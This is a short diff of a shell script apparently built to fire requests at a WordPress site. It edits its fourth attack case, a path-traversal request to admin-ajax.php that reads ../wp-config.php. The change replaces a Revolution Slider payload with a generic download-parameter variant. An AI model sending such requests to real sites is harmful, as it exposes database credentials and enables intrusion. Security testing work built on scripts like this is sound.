@@ -44,7 +44,7 @@ case ${ATTACK} in
         ;;
     4) # wp-admin/admin-ajax.php
         echo "=== attack on wp-admin/admin-ajax.php ===\n"
-        ab ${ABOPTS} -H "${HEADER}" -C "${COOKIE}" -T "text/plain" "${WPHOME}wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
+        ab ${ABOPTS} -H "${HEADER}" -C "${COOKIE}" -T "text/plain" "${WPHOME}wp-admin/admin-ajax.php?action=donwload&file=../wp-config.php"
         ;;
     *) # help
         echo "usage: $0 [-a \"attacker IP address\"] [-h \"WordPress home URL\"] [1-4]"
